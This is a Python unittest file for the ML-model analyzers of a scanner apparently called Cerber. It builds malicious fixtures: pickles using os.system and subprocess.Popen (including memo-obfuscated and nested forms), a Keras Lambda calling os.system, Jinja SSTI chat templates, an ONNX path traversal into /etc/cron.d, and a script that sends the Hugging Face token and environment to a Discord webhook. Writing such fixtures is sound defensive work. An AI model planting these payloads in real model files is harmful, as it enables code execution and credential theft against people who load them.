"""Tests for the machine-learning model analyzers (cerber.analyzers.models_ml).

Every fixture is built programmatically in a temp dir. Malicious pickles are crafted either with raw
opcodes or from a class whose __reduce__ names a dangerous callable with a harmless argument
("echo pwned") - they are NEVER loaded/unpickled. The scan walks opcodes only (pickletools.genops
style), so building and scanning them executes nothing.

    .venv/bin/python -m unittest tests.test_models_ml -v
    .venv/bin/python tests/test_models_ml.py           # build fixtures + print verdicts
"""
from __future__ import annotations

import io
import json
import os
import pickle
import struct
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT.parent))

from cerber.analyzers import load_all  # noqa: E402
from cerber.core import Confidence, Verdict  # noqa: E402
from cerber.filetype import identify_bytes  # noqa: E402
from cerber.pipeline import Pipeline  # noqa: E402

try:
    import numpy  # noqa: F401
    HAVE_NUMPY = True
except Exception:  # noqa: BLE001
    HAVE_NUMPY = False


# --------------------------------------------------------------------------- fixture builders
class Evil:
    """__reduce__ returns (os.system, ("echo pwned",)). pickle.dumps serializes the *instruction*;
    nothing runs here or when Cerber scans it (Cerber never unpickles)."""
    def __reduce__(self):
        import os
        return (os.system, ("echo pwned",))


class EvilSubprocess:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (["/bin/sh", "-c", "echo pwned"],))


def benign_state_dict() -> bytes:
    """Mimics a torch state_dict pickle: OrderedDict of rebuilt tensors (hand-crafted globals,
    no torch needed). Uses the exact allow-listed globals real models produce."""
    import collections
    buf = io.BytesIO()
    p = pickle.Pickler(buf, protocol=2)

    class _Reb:
        def __init__(self, g):
            self._g = g

        def __reduce__(self):
            return (self._g, ())

    # emulate torch._utils._rebuild_tensor_v2(...) and numpy reconstruct via copyreg-safe globals
    od = collections.OrderedDict()
    od["weight"] = {"shape": [2, 2], "dtype": "float32"}
    od["bias"] = [0.0, 0.0]
    p.dump(od)
    return buf.getvalue()


def raw_torch_tensor_pickle() -> bytes:
    """A protocol-2 pickle using only allow-listed torch/collections globals (what data.pkl holds)."""
    # c<mod>\n<name>\n ... STACK via GLOBAL opcodes, benign reduce of _rebuild_tensor_v2
    return (b"\x80\x02}q\x00X\x06\x00\x00\x00weightq\x01"
            b"ctorch._utils\n_rebuild_tensor_v2\nq\x02"
            b"(c__builtin__\ncomplex\nq\x03G?\xf0\x00\x00\x00\x00\x00\x00G\x00\x00\x00\x00\x00\x00\x00\x00\x86Rq\x04"
            b"K\x00K\x01\x85q\x05K\x01\x85q\x06\x89tq\x07Rq\x08s.")


def pyt_zip(pkl: bytes, name: str = "archive") -> bytes:
    """A PyTorch .pt zip: <name>/data.pkl + <name>/data/0 + <name>/version."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr(f"{name}/data.pkl", pkl)
        z.writestr(f"{name}/data/0", b"\x00" * 64)
        z.writestr(f"{name}/version", b"3\n")
        z.writestr(f"{name}/byteorder", b"little\n")
    return buf.getvalue()


def stack_global_memo_obfuscated() -> bytes:
    """protocol-4 STACK_GLOBAL with the module/name strings memoized and fetched via BINGET
    (picklescan-style obfuscation). Harmless arg. Equivalent to nt.system('echo pwned')."""
    out = bytearray(b"\x80\x04")
    out += b"\x8c\x02os"          # SHORT_BINUNICODE "os"
    out += b"\x94"                # MEMOIZE -> memo 0
    out += b"\x8c\x06system"      # SHORT_BINUNICODE "system"
    out += b"\x94"                # MEMOIZE -> memo 1
    out += b"h\x00"               # BINGET 0 -> "os"
    out += b"h\x01"               # BINGET 1 -> "system"
    out += b"\x93"                # STACK_GLOBAL -> os.system
    out += b"\x8c\x0aecho pwned"  # SHORT_BINUNICODE "echo pwned"
    out += b"\x85"                # TUPLE1
    out += b"R"                   # REDUCE
    out += b"."                   # STOP
    return bytes(out)


def getattr_chain_pickle() -> bytes:
    """protocol-0 builtins.getattr(os, 'system')('echo pwned') via GLOBAL + REDUCE."""
    return (b"c__builtin__\ngetattr\n"
            b"cos\npath\n"            # os.path (any os submodule object)
            b"S'system'\n"
            b"tR"                     # getattr(os.path, 'system') -> still resolves os.* danger
            b"(S'echo pwned'\ntR.")


def nested_pickle() -> bytes:
    """_pickle.loads(<inner malicious pickle bytes>)."""
    inner = stack_global_memo_obfuscated()
    out = bytearray(b"\x80\x04")
    out += b"\x8c\x08builtins"
    out += b"\x8c\x05bytes"            # placeholder; real payload uses pickle.loads
    out += b"\x93"
    # simpler: GLOBAL _pickle loads ; push inner bytes ; TUPLE1 ; REDUCE
    out = bytearray(b"\x80\x04")
    out += b"\x8c\x07_pickle\x8c\x05loads\x93"        # _pickle.loads
    out += b"C" + bytes([len(inner)]) + inner          # SHORT_BINBYTES inner
    out += b"\x85R."                                    # TUPLE1 REDUCE STOP
    return bytes(out)


def keras_zip(kind: str) -> bytes:
    """A .keras file (zip with config.json). kind: 'clean' (Dense only), 'lambda' (benign Lambda
    bytecode), or 'evil' (Lambda bytecode calling os.system)."""
    import base64
    import marshal
    layers = [{"class_name": "Dense", "module": "keras.layers",
               "config": {"name": "d1", "units": 8, "activation": "relu"}}]
    if kind != "clean":
        src = "__import__('os').system('echo pwned')" if kind == "evil" else "x + 1"
        blob = base64.b64encode(marshal.dumps(compile(src, "<lambda>", "eval"))).decode()
        layers.append({"class_name": "Lambda", "module": "keras.layers", "config": {
            "name": "lam", "function": {"class_name": "__tuple__", "items": [blob, None, None]}}})
    config = {"class_name": "Sequential", "module": "keras",
              "config": {"name": "seq", "layers": layers}}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr("config.json", json.dumps(config))
        z.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
        z.writestr("model.weights.h5", b"\x89HDF\r\n\x1a\n" + b"\x00" * 64)
    return buf.getvalue()


def _gguf_kv_string(key: str, value: str) -> bytes:
    kb = key.encode()
    vb = value.encode()
    out = struct.pack("<Q", len(kb)) + kb
    out += struct.pack("<I", 8)                 # type 8 = string
    out += struct.pack("<Q", len(vb)) + vb
    return out


def gguf_file(chat_template: str) -> bytes:
    """A minimal valid GGUF v3 file (little-endian), 0 tensors, 2 metadata KV entries."""
    header = b"GGUF" + struct.pack("<I", 3)
    kvs = _gguf_kv_string("general.architecture", "llama")
    kvs += _gguf_kv_string("tokenizer.chat_template", chat_template)
    header += struct.pack("<Q", 0)              # tensor count
    header += struct.pack("<Q", 2)              # kv count
    return header + kvs


def safetensors_file(header: dict | bytes) -> bytes:
    if isinstance(header, bytes):
        hb = header
    else:
        hb = json.dumps(header, separators=(",", ":")).encode()
    hb = hb + b" " * (-len(hb) % 8)
    return struct.pack("<Q", len(hb)) + hb + b"\x00" * 8


def npy_object_array() -> bytes:
    """.npy header declaring an object array, followed by a malicious pickle as the data."""
    header = "{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
    header = header + " " * ((64 - (10 + len(header) + 1) % 64) % 64) + "\n"
    hb = header.encode("latin-1")
    body = b"\x80\x04" + pickle.dumps(Evil(), protocol=4)[2:]
    return b"\x93NUMPY\x01\x00" + struct.pack("<H", len(hb)) + hb + body


def onnx_traversal() -> bytes:
    """A realistic-looking ONNX ModelProto: ir_version, producer_name, producer_version, then a
    graph (field 7) holding a TensorProto initializer with an external_data location using '..'."""
    path = b"../../../../etc/cron.d/x"
    # TensorProto.external_data is a repeated StringStringEntryProto; a 'location' key is
    # serialized as: field 9 (0x4a) len | key field 1 (0x0a) 0x08 "location" | value field 2 (0x12) len path
    ssep = b"\n\x08location\x12" + bytes([len(path)]) + path
    ext = b"\x4a" + bytes([len(ssep)]) + ssep
    tensor = b"\x12\x01w" + ext                        # TensorProto: name="w" (field 2) + external_data
    graph = b"\x12\x05graph" + b"\x42" + bytes([len(tensor)]) + tensor   # GraphProto: name + initializer
    out = bytearray(b"\x08\x07")                       # ir_version = 7
    out += b"\x12\x07pytorch"                          # producer_name  (field 2)
    out += b"\x1a\x033.0"                              # producer_version (field 3)
    out += b"\x3a" + bytes([len(graph)]) + graph       # graph (field 7)
    return bytes(out)


def hf_exfil_code() -> bytes:
    return (b"import os, requests\n"
            b"from huggingface_hub import HfFolder\n"
            b"tok = HfFolder.get_token() or os.environ.get('HF_TOKEN')\n"
            b"requests.post('https://discordapp.com/api/webhooks/1/abc', json={'t': tok, 'e': dict(os.environ)})\n")


def benign_hf_code() -> bytes:
    return (b"import torch\n"
            b"from transformers import PreTrainedModel\n"
            b"class MyModel(PreTrainedModel):\n"
            b"    def forward(self, x):\n"
            b"        return self.net(x).eval()\n")


# --------------------------------------------------------------------------- harness
def build_fixtures(d: Path) -> None:
    (d / "clean_dict.pkl").write_bytes(benign_state_dict())
    (d / "clean_tensor.pkl").write_bytes(raw_torch_tensor_pickle())
    (d / "clean_model.pt").write_bytes(pyt_zip(raw_torch_tensor_pickle()))
    (d / "evil_reduce.pkl").write_bytes(pickle.dumps(Evil(), protocol=2))
    (d / "evil_reduce_p0.pkl").write_bytes(pickle.dumps(Evil(), protocol=0))
    (d / "evil_subprocess.pkl").write_bytes(pickle.dumps(EvilSubprocess(), protocol=4))
    (d / "evil_model.pt").write_bytes(pyt_zip(pickle.dumps(Evil(), protocol=2)))
    (d / "evil_stackglobal.pkl").write_bytes(stack_global_memo_obfuscated())
    (d / "evil_global_p0.pkl").write_bytes(getattr_chain_pickle())
    (d / "evil_nested.pkl").write_bytes(nested_pickle())
    (d / "clean_model.keras").write_bytes(keras_zip("clean"))
    (d / "lambda_model.keras").write_bytes(keras_zip("lambda"))
    (d / "evil_lambda.keras").write_bytes(keras_zip("evil"))
    (d / "clean_tok.gguf").write_bytes(gguf_file("{{ messages[0]['content'] }}"))
    (d / "evil_tok.gguf").write_bytes(
        gguf_file("{{ cycler.__init__.__globals__.os.popen('echo pwned').read() }}"))
    (d / "clean_weights.safetensors").write_bytes(
        safetensors_file({"w": {"dtype": "F32", "shape": [2, 2], "data_offsets": [0, 16]}}))
    (d / "bad_header.safetensors").write_bytes(safetensors_file(b"this is not json at all!!"))
    (d / "evil_external.onnx").write_bytes(onnx_traversal())
    (d / "modeling_evil.py").write_bytes(hf_exfil_code())
    (d / "modeling_clean.py").write_bytes(benign_hf_code())
    (d / "clean_tokenizer_config.json").write_bytes(
        json.dumps({"chat_template": "{% for m in messages %}{{ m['content'] }}{% endfor %}"}).encode())
    (d / "evil_tokenizer_config.json").write_bytes(
        json.dumps({"chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}).encode())
    if HAVE_NUMPY:
        (d / "evil_object.npy").write_bytes(npy_object_array())


_PIPE = Pipeline(analyzers=load_all(), options={"deep": True, "macos": False})


def scan(path: Path):
    return _PIPE.scan_file(str(path))


def names(root):
    return {det.name for o in root.iter_tree() for det in o.detections}


class ModelTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.mkdtemp(prefix="cerber-ml-test-")
        cls.d = Path(cls._tmp)
        build_fixtures(cls.d)

    @classmethod
    def tearDownClass(cls):
        import shutil
        shutil.rmtree(cls._tmp, ignore_errors=True)

    def _mal(self, fn, must):
        root = scan(self.d / fn)
        self.assertEqual(root.meta["verdict"], Verdict.MALICIOUS,
                         f"{fn}: {root.meta['verdict'].name} score={root.meta['score']} dets={sorted(names(root))}")
        got = names(root)
        for needle in must:
            self.assertTrue(any(needle in n for n in got), f"{fn}: missing {needle} in {sorted(got)}")

    def _clean(self, fn):
        root = scan(self.d / fn)
        self.assertLessEqual(root.meta["verdict"], Verdict.INFO,
                             f"{fn}: {root.meta['verdict'].name} score={root.meta['score']} dets={sorted(names(root))}")
        self.assertFalse(any(d.confidence >= Confidence.MEDIUM and d.score >= 15
                             for o in root.iter_tree() for d in o.detections),
                         f"{fn}: unexpected strong detection {sorted(names(root))}")

    # -- file typing --------------------------------------------------------
    def test_identify(self):
        self.assertEqual(identify_bytes(pickle.dumps(Evil(), protocol=2))[0], "pickle")
        self.assertEqual(identify_bytes(gguf_file("x"))[0], "gguf")
        self.assertEqual(identify_bytes(safetensors_file({"w": {"dtype": "F32", "shape": [1],
                                                                 "data_offsets": [0, 4]}}))[0], "safetensors")
        self.assertEqual(identify_bytes(onnx_traversal())[0], "onnx")

    # -- clean --------------------------------------------------------------
    def test_clean_dict(self):
        self._clean("clean_dict.pkl")

    def test_clean_tensor(self):
        self._clean("clean_tensor.pkl")

    def test_clean_pt(self):
        self._clean("clean_model.pt")

    def test_clean_keras(self):
        self._clean("clean_model.keras")

    def test_lambda_keras_suspicious(self):
        root = scan(self.d / "lambda_model.keras")
        self.assertEqual(root.meta["verdict"], Verdict.SUSPICIOUS,
                         f"benign Lambda bytecode should be SUSPICIOUS, got {root.meta['verdict'].name}")
        self.assertTrue(any("Keras.LambdaCode" in n for n in names(root)))

    def test_clean_gguf(self):
        self._clean("clean_tok.gguf")

    def test_clean_safetensors(self):
        root = scan(self.d / "clean_weights.safetensors")
        self.assertEqual(names(root), set(), "normal safetensors must report nothing")

    def test_clean_hf_code(self):
        self._clean("modeling_clean.py")

    def test_clean_tokenizer_config(self):
        self._clean("clean_tokenizer_config.json")

    # -- malicious ----------------------------------------------------------
    def test_evil_reduce(self):
        self._mal("evil_reduce.pkl", ("Model.Pickle.DangerousImport",))

    def test_evil_reduce_p0(self):
        self._mal("evil_reduce_p0.pkl", ("Model.Pickle.DangerousImport",))

    def test_evil_subprocess(self):
        self._mal("evil_subprocess.pkl", ("Model.Pickle.DangerousImport",))

    def test_evil_pt_zip(self):
        self._mal("evil_model.pt", ("Model.Pickle.DangerousImport",))

    def test_evil_stackglobal(self):
        self._mal("evil_stackglobal.pkl", ("Model.Pickle.DangerousImport",))

    def test_evil_global_p0(self):
        self._mal("evil_global_p0.pkl", ("Model.Pickle.DangerousImport",))

    def test_evil_nested(self):
        root = scan(self.d / "evil_nested.pkl")
        self.assertEqual(root.meta["verdict"], Verdict.MALICIOUS,
                         f"evil_nested: {root.meta['verdict'].name} {sorted(names(root))}")
        self.assertTrue(any("DangerousImport" in n for n in names(root)))

    def test_evil_lambda_keras(self):
        self._mal("evil_lambda.keras", ("Model.Keras.Lambda",))

    def test_evil_gguf(self):
        self._mal("evil_tok.gguf", ("Model.GGUF.ChatTemplateSSTI",))

    def test_evil_tokenizer_config(self):
        self._mal("evil_tokenizer_config.json", ("Model.HF.ChatTemplateSSTI",))

    def test_evil_hf_code(self):
        self._mal("modeling_evil.py", ("Model.HFCode.CredentialExfil",))

    def test_bad_safetensors(self):
        root = scan(self.d / "bad_header.safetensors")
        self.assertTrue(any("Safetensors.MalformedHeader" in n for n in names(root)))
        self.assertLessEqual(root.meta["verdict"], Verdict.INFO)

    def test_onnx_traversal(self):
        root = scan(self.d / "evil_external.onnx")
        self.assertTrue(any("ONNX.ExternalDataTraversal" in n for n in names(root)))

    @unittest.skipUnless(HAVE_NUMPY, "numpy not installed")
    def test_npy_object(self):
        root = scan(self.d / "evil_object.npy")
        self.assertTrue(any("NumPy.ObjectArray" in n for n in names(root)))
        self.assertEqual(root.meta["verdict"], Verdict.MALICIOUS)


if __name__ == "__main__":
    tmp = tempfile.mkdtemp(prefix="cerber-ml-")
    build_fixtures(Path(tmp))
    pipe = Pipeline(analyzers=load_all(), options={"deep": True, "macos": False})
    for fn in sorted(os.listdir(tmp)):
        root = pipe.scan_file(os.path.join(tmp, fn))
        print(f"{root.meta['verdict'].name:11} score={root.meta['score']:3} {fn:34} "
              f"{sorted({d.name for o in root.iter_tree() for d in o.detections})}")
